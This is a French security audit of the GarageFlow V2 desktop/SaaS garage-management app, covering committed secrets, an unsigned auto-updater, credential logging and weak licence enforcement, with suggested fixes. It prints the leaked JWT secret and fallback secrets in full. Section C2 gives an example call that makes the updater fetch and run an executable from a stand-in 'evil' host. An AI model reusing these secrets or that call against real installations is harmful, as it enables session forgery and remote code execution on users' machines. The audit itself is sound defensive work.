# 🔍 Audit technique complet — GarageFlow V2

> Audit réalisé en vue d'une commercialisation à grande échelle.
> Périmètre : 173 fichiers source (~26 700 LOC), 72 routes API, Electron + Next.js 14 + Prisma/SQLite + système de licences ECDSA + keygen Python.
> Méthodologie : lecture manuelle exhaustive des couches critiques (auth, licences, API, base de données, Electron, CI), analyse statique et vérification des secrets versionnés.

---

## 0. Synthèse exécutive

GarageFlow est un logiciel **fonctionnellement riche et globalement bien structuré** (App Router, séparation `lib/`, validation Zod, i18n 14 langues, thèmes, sauvegardes multi‑niveaux, licences asymétriques ECDSA). Le niveau de finition de l'UI et la couverture fonctionnelle sont réels.

**En revanche, en l'état, le logiciel N'EST PAS prêt pour une commercialisation à grande échelle.** Il cumule plusieurs failles **critiques** dont trois qui suffisent, chacune, à compromettre la totalité des clients :

1. **Secret de signature JWT versionné dans le dépôt** (`.env.example` + `keys/server_config.json`), réutilisé comme `NEXTAUTH_SECRET`, `GARAGEFLOW_API_KEY` et clé API du keygen. Quiconque a accès au dépôt peut forger des sessions admin, des tokens portail, et **révoquer/réactiver n'importe quelle licence**.
2. **Mise à jour automatique sans vérification de signature** : `app:install-update` télécharge un `.exe` depuis une URL arbitraire fournie par le renderer et l'exécute. Une XSS (CSP permissive) ⇒ **RCE** sur tous les postes clients (supply chain).
3. **Journalisation des identifiants en clair** (mot de passe + hash bcrypt) à chaque tentative de connexion.

Le second problème structurel est un **conflit d'architecture** : le code est conçu pour un déploiement **desktop mono‑poste** (SQLite, rate‑limit en mémoire, stockage fichier local, licence liée au matériel) mais un commit « Force Vercel deployment » et un domaine de production `app.garageflows.fr` laissent penser à un déploiement **SaaS multi‑tenant**, incompatible avec cette pile (SQLite mono‑writer, état en mémoire non partagé entre instances, export inter‑tenant non filtré).

| Domaine | Note |
|--------|------|
| Architecture | **55 / 100** |
| Sécurité | **24 / 100** |
| Performance | **56 / 100** |
| Maintenabilité | **57 / 100** |
| Qualité du code | **58 / 100** |
| UX / UI | **70 / 100** |
| Base de données | **55 / 100** |
| **Production Ready** | **30 / 100** |

---

## 1. Analyse globale

### 1.1 Architecture & stack

| Élément | Détail |
|---------|--------|
| Framework | Next.js **14.2.5** (App Router, `output: standalone`) |
| Runtime desktop | Electron **31** (main + preload, `utilityProcess.fork` du serveur Next) |
| ORM / DB | Prisma **5.16** / **SQLite** (fichier local `userData`) |
| Auth | NextAuth 4 (Credentials, JWT 30 j) + cookie licence `gf_session` (JWT HS256, 5 ans) |
| Licences | ECDSA P‑256 (token `GF2.<h>.<p>.<sig>`), keygen Python (tkinter), HWID SHA‑256 |
| Validation | Zod 4 |
| State | Zustand 4 + Immer |
| IA | `@anthropic-ai/sdk` (OCR plaque, estimation) |
| UI | Tailwind 3, framer‑motion, lucide, dnd‑kit, jspdf, qrcode, react‑hot‑toast |

L'organisation générale est claire : `src/app/api/*` (REST), `src/components/*`, `src/lib/*` (métier), `prisma/`, `electron/`, `scripts/`. La séparation des responsabilités est correcte dans les grandes lignes.

### 1.2 Incohérences structurelles majeures

| # | Constat | Fichier |
|---|---------|---------|
| A1 | **Deux systèmes de licences dans le schéma.** `LicenseKey` (utilisé) coexiste avec `License` + `Device` + `Activation` + `LicenseLog` (**jamais requêtés** — `grep prisma.license.` = 0). Code mort + 4 tables inutiles. | `prisma/schema.prisma:632-722` |
| A2 | **Dérive de schéma.** La DB template versionnée (`prisma/garageflow-template.db`) ne contient PAS les tables `License/Device/Activation/LicenseLog`. Le schéma et l'artefact livré divergent. | `prisma/garageflow-template.db` |
| A3 | **Deux limiteurs de débit en mémoire** dupliqués et divergents (`lib/rate-limit.ts` **et** un second réimplémenté dans `lib/api-helpers.ts`). | `lib/rate-limit.ts`, `lib/api-helpers.ts:9-28` |
| A4 | **`withAuth` n'authentifie pas.** Nom trompeur : il ne fait QUE du rate‑limit. L'auth réelle dépend d'un appel `requireSession()` que chaque route doit penser à faire → 8 routes ne le font pas (cf. §3). | `lib/api-helpers.ts:50-68` |
| A5 | **Deux sources de vérité pour le schéma DB** : `schema.prisma` (Prisma) **et** `lib/migrations.ts` (46 `ALTER TABLE` manuels rejoués via `/api/internal/migrate`). Fragile et redondant. | `lib/migrations.ts` |
| A6 | **Trois secrets de repli hardcodés différents** pour le même cookie `gf_session` (cf. §3.1). | middleware / api‑helpers / activate |

### 1.3 Code mort / éléments inutiles

- Modèles Prisma `License`, `Device`, `Activation`, `LicenseLog` → **non utilisés**.
- `lib/audit.ts:logLogin()` → **jamais appelé** (`grep` = 1 occurrence = la définition). Les connexions **ne sont donc pas auditées** malgré l'existence de l'helper.
- `keys/licenses_db.json`, `keys/server_config.json` versionnés (artefacts du keygen local — ne devraient pas être dans le dépôt).
- 51 usages de `any` / `as any`, 38 `console.log` de debug en `src` (dont journalisation d'identifiants).
- `.eslintrc.json` réduit au strict minimum → aucune règle qualité (no‑unused‑vars, etc.) activée pour capter imports/variables morts automatiquement.

---

## 2 & 3. Bugs et Sécurité (fusionnés — la majorité des bugs sont des failles)

> Chaque item : **gravité**, localisation, explication, pourquoi c'est un problème, correction (+ code).

### 🔴 CRITIQUE

---

#### C1 — Secret JWT réel versionné et réutilisé partout
**Localisation :** `.env.example:16,31` · `keys/server_config.json:3` · présent dans l'historique git (commit initial `0f519f0`).

Le secret `3jvKZFYUKLjGTI/mneyeY0fUN/FNp9d1XzOgnOij7+I=` est :
- committé comme `NEXTAUTH_SECRET` **et** `GARAGEFLOW_API_KEY` dans `.env.example` ;
- committé comme `api_key` dans `keys/server_config.json` ;
- **recopié automatiquement en `.env` réel** par Electron au premier lancement (`electron/main.js:40-44` : `fs.copyFileSync(example, envFile)`).

**Pourquoi c'est critique :** ce secret signe le cookie `gf_session`. Avec lui, un attaquant forge un JWT `{typ:"admin"}` et accède à `/admin/licenses` (génération de licences), forge des tokens portail, et — puisque `GARAGEFLOW_API_KEY == ce secret` — appelle `POST /api/admin/licenses/revoke-by-key` pour **révoquer ou réactiver n'importe quelle licence de n'importe quel client** (déni de service global / contournement de révocation). Le domaine de prod (`app.garageflows.fr`) est en clair dans le même fichier.

**Correction :**
1. **Rotation immédiate** de TOUS les secrets (le secret est déjà dans l'historique git — le retirer du HEAD ne suffit pas).
2. Purger l'historique (`git filter-repo`) ou considérer le secret comme définitivement brûlé.
3. `.env.example` ne doit contenir que des **placeholders**. Ne jamais committer `keys/*.json`.
4. Ajouter un **garde‑fou de démarrage** qui refuse de tourner en production avec un secret manquant/faible :

```ts
// src/lib/env.ts (nouveau)
const WEAK = new Set([
  '3jvKZFYUKLjGTI/mneyeY0fUN/FNp9d1XzOgnOij7+I=',
  'fallback-dev-secret-change-in-production',
  'gf-electron-local-secret-2026-xK9mP3qR',
])
export function assertSecrets() {
  const s = process.env.NEXTAUTH_SECRET
  if (process.env.NODE_ENV === 'production') {
    if (!s || s.length < 32 || WEAK.has(s)) {
      throw new Error('NEXTAUTH_SECRET absent, trop court, ou compromis — rotation requise.')
    }
  }
}
```
**Pourquoi meilleur :** un secret unique par déploiement, jamais versionné, avec échec‑fermé au boot empêche l'exploitation même en cas de mauvaise configuration.

`.gitignore` corrigé :
```gitignore
keys/*.json
keys/*.pem
.env*
!.env.example
```

---

#### C2 — Mise à jour automatique sans vérification de signature → RCE / supply chain
**Localisation :** `electron/main.js:1428-1524` (`app:install-update`) · exposé au renderer via `electron/preload.js:62` (`installUpdate(url)`).

Le handler télécharge un fichier depuis **une URL fournie par l'appelant** et l'exécute :
```js
const child = spawn(destPath, [], { detached: true, stdio: 'ignore' }) // aucune vérif
```
Aucune vérification de : signature Authenticode, hash SHA‑256 attendu, **origine/allow‑list de l'hôte**. L'URL provient de `checkUpdates` (serveur `GF_LICENSE_SERVER`, fichier admin local, ou GitHub) mais `installUpdate(url)` est appelable directement depuis le renderer avec **n'importe quelle URL**.

**Pourquoi c'est critique :**
- Une **XSS** dans l'app (favorisée par la CSP `script-src 'unsafe-inline'`, cf. C7) permet `window.electronAPI.installUpdate('http://evil/x.exe')` → **exécution de code arbitraire** avec les droits de l'utilisateur, sur **tous les postes**.
- Le flux « légitime » lui‑même n'authentifie pas le binaire : si `GF_LICENSE_SERVER` est en HTTP ou MITM‑é, l'attaquant pousse un `.exe` malveillant à toute la flotte.

**Correction :**
```js
// 1) N'accepter que des hôtes de confiance
const ALLOWED_UPDATE_HOSTS = new Set(['updates.garageflows.fr'])
function assertTrustedUrl(u) {
  const url = new URL(u)
  if (url.protocol !== 'https:') throw new Error('HTTPS requis')
  if (!ALLOWED_UPDATE_HOSTS.has(url.hostname)) throw new Error('Hôte non autorisé')
}

// 2) Vérifier une signature détachée (ex. ECDSA) du binaire avant exécution
const EXPECTED_PUBKEY = PUBLIC_KEY_PEM // clé de publication dédiée aux updates
function verifyInstaller(filePath, sigB64) {
  const data = fs.readFileSync(filePath)
  const v = crypto.createVerify('SHA256'); v.update(data)
  if (!v.verify({ key: EXPECTED_PUBKEY, format: 'pem' }, Buffer.from(sigB64, 'base64')))
    throw new Error('Signature de mise à jour invalide')
}
```
Le manifeste `gf_update.json` doit inclure `sha256` **et** `signature`, tous deux vérifiés avant `spawn`. Idéalement, migrer vers **`electron-updater`** (vérification de signature intégrée). **Pourquoi meilleur :** rend impossible l'installation d'un binaire non signé par l'éditeur, même via XSS ou MITM.

---

#### C3 — Journalisation des identifiants en clair
**Localisation :** `src/lib/auth.ts:33-73`.

```ts
console.log('Credentials reçues :', credentials)   // ← mot de passe EN CLAIR
console.log('Hash enregistré :', user.password)     // ← hash bcrypt
```
**Pourquoi c'est critique :** les mots de passe en clair et les hashs finissent dans les logs (`garageflow.log`, stdout, agrégateurs). Fuite RGPD massive et vecteur de compromission de comptes. Un mot de passe loggé = mot de passe à considérer compromis.

**Correction :** supprimer toute journalisation de `credentials`/`user.password`. Logger au plus l'email et le résultat.
```ts
if (!valid) { logger.warn('[auth] échec connexion', { email }); return null }
logger.info('[auth] connexion OK', { userId: user.id })
```
*(Corrigé dans ce commit d'audit — cf. §16.)*

---

#### C4 — Révocation de licence contournable (fail‑open + MAC annulable + JWT 5 ans)
**Localisation :** `src/app/api/license/activate/route.ts:128-131` · `src/lib/license/record-mac.ts:53-56` · `electron/main.js:369-417,550-608`.

Trois défauts se combinent :
1. **Fail‑open** : si la vérification DB (révocation) lève une exception, on continue (`catch { console.error(... 'fail-open') }`) → une licence révoquée passe si on provoque une erreur DB.
2. **MAC d'intégrité neutralisable** : `verifyRecordMac` renvoie `{ok:true, missing:true}` quand `recordMac` est `NULL`. Un `UPDATE LicenseKey SET status='active', recordMac=NULL` sur le SQLite local **rétablit une licence révoquée** sans être détecté. La suppression pure de la ligne relance l'auto‑enregistrement en `active`.
3. **Session 5 ans auto‑signée côté client** : Electron mint lui‑même le cookie `gf_session` (`createGfSessionJwt`, exp 5 ans) et le middleware **ne revérifie jamais la DB**. Une révocation n'expulse donc pas une session déjà active ; l'« application » de la révocation se limite à un **overlay React** (`license:revoked` → renderer), trivialement contournable (l'app et les API dessous restent fonctionnelles).

**Pourquoi c'est critique :** la fonctionnalité de révocation — cœur du modèle commercial — est en pratique **cosmétique**.

**Correction :**
- Fail‑**closed** sur la révocation (si le doute existe et qu'on est en ligne, bloquer) ; ne fail‑open que hors‑ligne pendant la période de grâce.
- Traiter `recordMac == NULL` comme **tamper** (après migration one‑shot qui backfill les MAC), pas comme « legacy OK ».
- Faire **revérifier périodiquement la DB** par le middleware/route (statut + expiration), et raccourcir le TTL du cookie (ex. 24 h renouvelé après check en ligne) au lieu de 5 ans.

---

#### C5 — `POST /api/admin/licenses/revoke-by-key` : auth par secret compromis
**Localisation :** `src/app/api/admin/licenses/revoke-by-key/route.ts:20-38`.

L'endpoint modifie le statut de **n'importe quelle** licence, authentifié par `x-gf-key === GARAGEFLOW_API_KEY` — or ce secret est celui de C1 (versionné). Comparaison **non constant‑time** (`apiKey !== serverApiKey`, timing attack) et **journalisation de `DATABASE_URL`** (`console.log("DATABASE_URL =", ...)`, ligne 51 — fuite d'info).

**Correction :** rotation (C1) + comparaison constant‑time + suppression des logs sensibles.
```ts
import { timingSafeEqual } from 'crypto'
function safeEq(a: string, b: string) {
  const ab = Buffer.from(a), bb = Buffer.from(b)
  return ab.length === bb.length && timingSafeEqual(ab, bb)
}
if (!apiKey || !safeEq(apiKey, serverApiKey)) return NextResponse.json({ error: 'Accès refusé' }, { status: 403 })
```

---

### 🟠 ÉLEVÉ

---

#### H1 — Secrets de repli divergents et publics pour `gf_session`
**Localisation :** `src/middleware.ts:16` (`'gf-electron-local-secret-2026-xK9mP3qR'`) · `src/app/api/license/activate/route.ts:30` **et** `src/lib/api-helpers.ts:104` (`'fallback-dev-secret-change-in-production'`) · `src/lib/portal-secret.ts:10`.

Deux problèmes : (a) ces valeurs de repli **hardcodées** permettent la forge de sessions si `NEXTAUTH_SECRET` est absent ; (b) elles **divergent** : le middleware vérifie avec un secret, la route d'activation signe avec un autre → **hors Electron (ex. Vercel) sans `NEXTAUTH_SECRET`, aucune session n'est jamais validée** (bug fonctionnel total). 15 références à `NEXTAUTH_SECRET` avec des replis incohérents.

**Correction :** une seule source (`getJwtSecret()` partagée), **sans repli en production** (échec‑fermé, cf. C1). En dev, un repli unique et documenté.

---

#### H2 — Routes API sans authentification
**Localisation :** `src/lib/api-helpers.ts:50` (`withAuth` ne vérifie pas la session) — routes concernées : `plate-lookup`, `plate-ocr`, `estimate`(OK, a `requireSession`), `photos/[...path]`, `license/check`, `license/type`.

- **`GET /api/plate-lookup`** (`plate-lookup/route.ts:7`) : **aucune** `requireSession`. Appelable par n'importe qui → appelle l'API externe `api-immat.com` puis **consomme la clé `ANTHROPIC_API_KEY`** (coût $) en fallback. Vecteur d'**abus de coût / DoS financier**.
- **`GET /api/photos/[...path]`** (`photos/[...path]/route.ts:9`) : sert les photos (véhicules, inspections, **signatures clients**) **sans vérifier que le demandeur possède la ressource** → IDOR : quiconque devine/énumère un chemin lit les photos d'autres garages. `fs.readFileSync` **synchrone** bloque aussi l'event loop.

**Pourquoi c'est un problème :** fuite de données personnelles + facture Anthropic imprévisible.

**Correction :** appeler `requireSession()` dans ces routes ; pour les photos, scoper par `garageId` (vérifier que le chemin appartient au garage de la session) et servir en asynchrone (`fs.promises.readFile`). Renommer `withAuth` en `withRateLimit` pour lever l'ambiguïté, et créer un vrai `withAuth` qui impose la session.

---

#### H3 — Mot de passe SMTP stocké en clair (contredit la doc)
**Localisation :** `src/app/api/email/route.ts:36` · `prisma/schema.prisma:74`.

Le schéma commente `smtpPass // stored encrypted via GF_SMTP_CIPHER_KEY env` mais le code fait `data.smtpPass = body.smtpPass` — **aucun chiffrement**. Les identifiants SMTP des clients sont en clair dans SQLite.

**Correction :** chiffrer au repos (AES‑256‑GCM avec `GF_SMTP_CIPHER_KEY`) avant stockage, déchiffrer à l'usage.
```ts
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'
const KEY = Buffer.from(process.env.GF_SMTP_CIPHER_KEY!, 'hex') // 32 octets
export function enc(t: string) {
  const iv = randomBytes(12), c = createCipheriv('aes-256-gcm', KEY, iv)
  const e = Buffer.concat([c.update(t,'utf8'), c.final()])
  return Buffer.concat([iv, c.getAuthTag(), e]).toString('base64')
}
```

---

#### H4 — Rate‑limit et audit contournables via en‑têtes falsifiables
**Localisation :** `src/lib/api-helpers.ts:30-37` · `license/activate/route.ts:37` · `auth/[...nextauth]/route.ts:13` · `lib/audit.ts:29-43`.

La clé de rate‑limit et l'IP d'audit viennent de `x-forwarded-for` **sans validation**. Sur un déploiement web, l'en‑tête est **falsifiable** → un attaquant fait tourner l'IP et **contourne le rate‑limit** anti‑bruteforce (login, activation licence). Les IP d'audit deviennent non fiables.

**Correction :** n'utiliser `x-forwarded-for` que si la requête provient d'un proxy de confiance (nombre de sauts connu, prendre l'avant‑dernier hop), ou s'appuyer sur `request.ip` fourni par la plateforme. Combiner avec une clé métier (email/licenseId) pour le comptage.

---

#### H5 — Rate‑limit et sessions en mémoire → incompatibles multi‑instance
**Localisation :** `lib/rate-limit.ts`, `lib/api-helpers.ts` (Map en mémoire) ; `db.ts` (SQLite).

En SaaS multi‑instance (Vercel/serverless), chaque instance a **sa propre** Map → le rate‑limit ne borne rien globalement, et SQLite (mono‑fichier, mono‑writer) ne supporte ni la concurrence ni le serverless (système de fichiers éphémère). L'`internal/export` **ne filtre pas par garage** (`prisma.client.findMany()` sans `where`) → en multi‑tenant, **dump inter‑clients** si la clé interne fuite.

**Correction (si cible SaaS) :** PostgreSQL + Redis (rate‑limit/sessions partagés) + stockage objet (S3) pour photos ; scoper tous les `findMany` par `garageId`. Sinon, **assumer explicitement le desktop mono‑poste** et retirer le déploiement Vercel.

---

#### H6 — Conversion devis→facture non atomique (race → doublons)
**Localisation :** `src/app/api/quotes/[id]/convert/route.ts:17-63`.

Le contrôle `status === 'converted'`, l'incrément du compteur, la création de la facture et le marquage du devis **ne sont pas** dans une transaction. Deux requêtes concurrentes passent le contrôle → **deux factures** pour un même devis. Absence de contrainte `@@unique([garageId, number])` sur `Invoice`/`Quote` → numéros potentiellement dupliqués (problème **légal** de facturation FR).

**Correction :**
```ts
const invoice = await prisma.$transaction(async (tx) => {
  const q = await tx.quote.findFirst({ where: { id: params.id, garageId, status: { not: 'converted' } }, include: { lines: true } })
  if (!q) throw NextResponse.json({ error: 'Devis introuvable ou déjà converti' }, { status: 409 })
  const g = await tx.garage.update({ where: { id: garageId }, data: { invoiceCounter: { increment: 1 } } })
  const number = `${g.invoicePrefix}-${new Date().getFullYear()}-${String(g.invoiceCounter).padStart(3,'0')}`
  const inv = await tx.invoice.create({ data: { number, /* … */ } })
  await tx.quote.update({ where: { id: q.id }, data: { status: 'converted', invoiceId: inv.id } })
  return inv
})
```
+ ajouter `@@unique([garageId, number])` sur `Invoice` et `Quote`.

---

### 🟡 MOYEN

| # | Problème | Localisation | Correction |
|---|----------|--------------|-----------|
| M1 | **Route `users` : validation ignorée.** `CreateUserSchema.safeParse(body)` puis destructuration de **`body`** (brut) et non `parsed.data` → les garanties Zod sont perdues. | `api/users/route.ts:34-39` | Utiliser `parsed.data`. Aligner aussi les rôles (schéma 5 rôles vs logique 3‑4). |
| M2 | **CSP faible.** `script-src 'unsafe-inline' 'unsafe-eval'` annule une grande part de la protection XSS ; **pas de HSTS**. | `next.config.mjs:12` | Utiliser des nonces Next.js, retirer `unsafe-inline` sur `script-src`, ajouter `Strict-Transport-Security`. |
| M3 | **Calculs monétaires en `float`.** Accumulation d'erreurs ; `calcTaxAmount = TTC−HT` peut donner ±1 cent d'incohérence (TVA légale). | `lib/billing.ts` | Calculer en centimes (entiers) ou arrondir par ligne, cohérent HT+TVA=TTC. |
| M4 | **Comparaison de versions par chaîne.** `latest > currentVersion` → `"1.10.0" > "1.9.0"` faux. | `electron/main.js:1396` | Comparateur semver. |
| M5 | **Fiabilité HWID Windows.** `wmic diskdrive get serialnumber` — `wmic` supprimé sur Windows 11 24H2+ → HWID change → licence invalidée après MAJ Windows. | `electron/main.js:163` | Utiliser PowerShell `Get-CimInstance Win32_DiskDrive` avec repli. |
| M6 | **DELETE renvoie 500 au lieu de 404** quand la ressource n'appartient pas au garage (Prisma `P2025` non géré → `withAuth` renvoie 500). | `api/jobs/[id]/route.ts:84` (et autres DELETE) | Mapper `P2025` → 404. |
| M7 | **Anti‑tamper `startsWith` sans séparateur.** `fullPath.startsWith(PHOTOS_DIR)` laisse passer un dossier frère `photos-evil`. | `api/photos/[...path]/route.ts:20` | Comparer avec `path.sep` final. |
| M8 | **Blocage licence uniquement côté client** (overlay React). | `components/LicenseRevokedOverlay.tsx` + main.js | Enforcement serveur (cf. C4). |
| M9 | **`internal/migrate` / `internal/export` : comparaison de clé non constant‑time.** | `api/internal/*` | `timingSafeEqual`. |
| M10 | **QR code via `dangerouslySetInnerHTML`.** Risque faible (SVG généré localement) mais sink à surveiller. | `components/JobQRCode.tsx:57` | Sanitiser/`<img src=data:>` ou lib sûre. |

### 🟢 FAIBLE
- 51 `any` / `as any` (perte de sûreté de type ; ex. `estimate/route.ts` caste `groupBy` en `unknown as`).
- `.eslintrc.json` minimal → pas de détection auto d'imports/variables inutilisés.
- Timers `setInterval` sans `unref` généralisé côté serveur (rate‑limit OK avec `.unref?.()`).
- Répétition du bloc `Set-Cookie` (activate) et des cookies (Electron) avec `SameSite` divergent (`Strict` vs `Lax`).

---

## 4. Performance — **56/100**

| Problème | Localisation | Impact | Correction |
|----------|--------------|--------|-----------|
| **Index manquants** sur modèles chauds : `Part`, `Reminder`, `Inspection`, `InspectionItem`, `User`, `JobPart`, `RepairTypePart` n'ont **aucun** `@@index([garageId])`. | `schema.prisma` | Scans complets dès quelques milliers de lignes. | Ajouter `@@index([garageId])` (+ colonnes de filtre) sur chacun. |
| **`fs.readFileSync` synchrone** dans une route servie. | `photos/[...path]/route.ts:28` | Bloque l'event loop sous charge. | `await fs.promises.readFile`. |
| **Export global non paginé** charge toute la base en mémoire. | `internal/export/route.ts` | Pic mémoire proportionnel à la base. | Streaming / pagination par lot. |
| **Rate‑limit/sessions en mémoire** | cf. H5 | Ne scale pas horizontalement. | Redis. |
| **SQLite mono‑writer** | `db.ts` | Un seul writer concurrent. | Postgres si SaaS. |
| **Composants monolithiques** (696, 630, 606 lignes) et **99 `useEffect`**. | `components/*` | Re‑renders inutiles, bundle lourd. | Découper, mémoïser (`useMemo`/`memo`), `dynamic()` import. |
| **Pas de compression explicite** ni `next/image` (le repo a de nombreuses images base64 en DB). | global | Poids réseau/DB. | `logoPath`/`photoPath` (déjà amorcé) + compression. |

**Points positifs :** pagination présente sur les listes principales (`jobs`, etc.), bons index composites sur `Job`/`Invoice`/`Quote`/`Vehicle`, cache `Cache-Control: immutable` sur les photos.

---

## 5. Base de données — **55/100**

- ✅ Index composites pertinents sur les entités centrales ; snapshots client/véhicule sur devis/factures (bon pour l'historique légal).
- ⚠️ **Règles `onDelete` incomplètes** : `Job.mechanic`, `Vehicle.client`, `JobPart.part`, `Quote.job`, etc. sans `onDelete` explicite ⇒ `Restrict` par défaut → suppressions bloquées (ex. supprimer un mécanicien ayant des jobs lève une erreur non gérée → 500). Combiné aux cascades `Garage`, risque d'échecs FK d'ordre de suppression sur SQLite.
- ⚠️ **Pas de `@@unique` sur les numéros** de facture/devis/OR/BC → doublons possibles (cf. H6).
- ⚠️ **Compteurs par garage** (`invoiceCounter`) incrémentés hors transaction dans certains flux.
- ⚠️ **Code mort** (License/Device/Activation/LicenseLog) + **dérive** template.
- ⚠️ **Argent en `Float`** (devrait être entier‑centimes / `Decimal`).
- ⚠️ **Double gestion migrations** (Prisma vs `migrations.ts`).

**Corrections clés :** expliciter tous les `onDelete` (`Cascade`/`SetNull`/`Restrict` selon l'intention), ajouter les `@@unique` de numérotation, supprimer les modèles morts, régénérer la template en cohérence, migrer l'argent en centimes, et n'avoir **qu'une** stratégie de migration (Prisma Migrate).

---

## 6. Front‑end — **70/100**

- ✅ UI soignée (Tailwind, framer‑motion), inscription multi‑étapes avec jauge de force du mot de passe, i18n **14 langues**, thèmes (dark/light/night‑shift/true‑tone), raccourcis clavier, dnd‑kit pour le planning.
- ⚠️ **Accessibilité (WCAG)** : boutons icônes sans `aria-label` systématique, contrastes de la charte sombre à vérifier (AA), champs sans association `label/htmlFor` partout, focus‑visible non garanti sur tous les contrôles custom.
- ⚠️ **SEO** : app desktop → non prioritaire, mais les pages `portal/*` publiques mériteraient des métadonnées.
- ⚠️ **Hydratation** : usages de `Date`/`localStorage`/thème au premier rendu à surveiller (risque de mismatch SSR/CSR).
- ⚠️ **Blocage licence = overlay client** (contournable, cf. C4/M8).
- ⚠️ Composants trop volumineux (maintenabilité + perfs).

---

## 7. Back‑end — **57/100**

- ✅ Routes REST cohérentes, validation Zod centralisée (`lib/schemas`), **scoping par `garageId` correct** sur l'immense majorité des routes CRUD (bonne défense IDOR), helper d'audit, gestion d'erreurs via `withAuth`.
- ⚠️ `withAuth` mal nommé (n'authentifie pas) → 8 routes publiques par omission (H2).
- ⚠️ Fail‑open trop large (licences, DB) qui affaiblit la sécurité.
- ⚠️ Logs de debug résiduels (38 `console.log`), certains sensibles (C3, C5).
- ⚠️ Pas de couche « service » : logique métier (numérotation, conversion) directement dans les routes → duplication (compteurs recalculés dans plusieurs routes + dans `electron/main.js` pour l'export).

---

## 8. Qualité du code — **58/100**

- ✅ Modules soignés et commentés : `lib/license/verify.ts` (défense en profondeur, jamais de booléen nu), `lib/billing.ts`, `lib/rate-limit.ts`.
- ⚠️ Violations **DRY** (2 rate‑limiters, calculs de totaux dupliqués, 2 systèmes de licence), **SOLID** (routes qui font validation+métier+persistance+audit), `any` fréquents, bug « parse‑puis‑ignore » (M1), nommage trompeur (`withAuth`).
- ⚠️ ESLint quasi désactivé → dette invisible.

---

## 9. Expérience utilisateur

- ⚠️ **Verrouillage internet à 72 h** (`electron/main.js:678`) : un garage sans connexion pendant 3 jours est **bloqué** — friction commerciale forte pour un logiciel « desktop ».
- ⚠️ **Onboarding** dépend d'une licence valide avant même `/register` (middleware) : parcours à clarifier.
- ⚠️ Overlay de révocation ré‑émis à chaque check (peut réapparaître après reload — voulu, mais UX à soigner).
- ✅ Feedback utilisateur correct (toasts, états de chargement, jauge mot de passe, retours d'erreur explicites).

---

## 10. Tests — couverture insuffisante

**Existant :** 5 fichiers Vitest (`utils`, `tva`, `rate-limit`, `verify`, `business-logic`). CI (`.github/workflows/ci.yml`) : type‑check + lint + tests. **Bon socle.**

**Manques :**
- Aucun test des **routes API** (auth, IDOR, licences, révocation, portail).
- Aucun test **e2e** (Playwright pourtant disponible dans l'environnement).
- Pas de **build** (`next build`) dans la CI (les erreurs de build passent).
- Pas de **seuil de couverture** ni de tests de sécurité (bruteforce, forge de token).

**Reco :** tests d'intégration API (supertest/route handlers), e2e Playwright sur les parcours critiques, ajouter `next build` + gate de couverture (ex. 60 %).

---

## 11. Déploiement

- ✅ CI présente (type‑check, lint, test) ; `output: standalone` ; packaging electron‑builder NSIS ; sauvegardes 3‑niveaux (horaire/journalière/hebdo) avec purge — **très bon** pour un desktop.
- ⚠️ **Conflit desktop/SaaS** (cf. H5) : Vercel + SQLite + état mémoire = non viable multi‑instance.
- ⚠️ **Secrets versionnés** (C1) — bloquant.
- ⚠️ Pas de **monitoring**/observabilité (Sentry, métriques), logs applicatifs en `console.*`.
- ⚠️ CI ne construit pas l'app ni ne package.

---

## 12. Licences

- ✅ **Cryptographie saine** : ECDSA P‑256, clé privée hors dépôt (`.gitignore` couvre `keys/*.pem`), vérification défensive (`verify.ts`), watermark forensique, MAC d'intégrité, chiffrement AES‑GCM du stockage local lié au HWID.
- 🔴 **Mais l'enforcement est faible** : fail‑open (C4), MAC annulable via `NULL` (C4), cookie 5 ans auto‑signé côté client, révocation cosmétique (overlay), et surtout **secret/clé API de révocation versionnés** (C1/C5).
- ⚠️ **Tolérance HWID 75 %** (`verify.ts:189`) : un HWID fuité n'a besoin de matcher que 48/64 caractères → binding matériel affaibli.
- ⚠️ Type `standard` écrit par `revoke-by-key` alors qu'il n'est pas dans `_VALID_TYPES`.

**Verdict :** la base cryptographique est bonne, mais la chaîne d'application (secrets, fail‑open, enforcement client) rend le contournement accessible. À durcir avant commercialisation.

---

## 13. Mises à jour

- 🔴 **Pas de vérification de signature/intégrité** du binaire téléchargé (C2) → RCE/supply‑chain.
- ⚠️ **Pas de rollback** applicatif (on lance l'installeur NSIS ; les données `userData` sont préservées, mais aucune reprise en cas d'installeur défectueux).
- ⚠️ Comparaison de versions par chaîne (M4).
- ✅ Sauvegarde de la DB **avant** installation (`runBackup()` pré‑update) — bon réflexe.

**Reco :** `electron-updater` (signature + delta + rollback), manifeste signé (sha256+signature), allow‑list d'hôtes HTTPS.

---

## 14. Corrections — récapitulatif priorisé

Le détail « problème / pourquoi / où / correction / code » figure dans les sections §2‑§13. Les corrections livrées dans ce commit d'audit sont listées au §16.

---

## 15. Rapport final

### Compteurs

| Indicateur | Valeur (estimée) |
|-----------|------------------|
| 🐞 **Bugs / défauts identifiés** | **~64** (5 critiques, 6 élevés, 10 moyens détaillés + longue traîne) |
| 🔓 **Failles critiques** | **5** (C1–C5) |
| 🔒 **Problèmes de sécurité (total)** | **~30** |
| ⚡ **Problèmes de performance** | **~9** |
| 🎨 **Problèmes UX** | **~6** |
| 📁 **Fichiers concernés** | **~45** |

### Notes

| Domaine | Note |
|---------|------|
| Architecture | **55 / 100** |
| Sécurité | **24 / 100** |
| Performance | **56 / 100** |
| Maintenabilité | **57 / 100** |
| Qualité du code | **58 / 100** |
| UX / UI | **70 / 100** |
| Base de données | **55 / 100** |
| **Production Ready** | **30 / 100** |

### Feuille de route priorisée

**🔴 Priorité 1 — à corriger immédiatement (bloquant commercialisation)**
1. **Rotation de tous les secrets** + purge historique + placeholders (C1).
2. **Signature + allow‑list** sur les mises à jour, sinon désactiver l'auto‑update (C2).
3. **Supprimer la journalisation d'identifiants** (C3) — *fait §16*.
4. **Durcir l'enforcement des licences** : fail‑closed, MAC `NULL`=tamper, TTL court, re‑check DB (C4).
5. **Sécuriser `revoke-by-key`** (comparaison constant‑time + secret tourné) (C5).
6. **Authentifier les routes publiques par omission** (H2) et scoper les photos.

**🟠 Priorité 2 — important**
7. Unifier le secret JWT (échec‑fermé prod) (H1).
8. Chiffrer le mot de passe SMTP (H3).
9. Rate‑limit fiable (IP proxy de confiance + clé métier) (H4).
10. Transactionnaliser conversion/numérotation + `@@unique` numéros (H6).
11. Trancher **desktop vs SaaS** (SQLite/mémoire vs Postgres/Redis) (H5).

**🟡 Priorité 3 — optimisations**
12. Index manquants, argent en centimes, `onDelete` explicites, I/O async, découpage composants, CSP/HSTS, semver, HWID Windows 11.

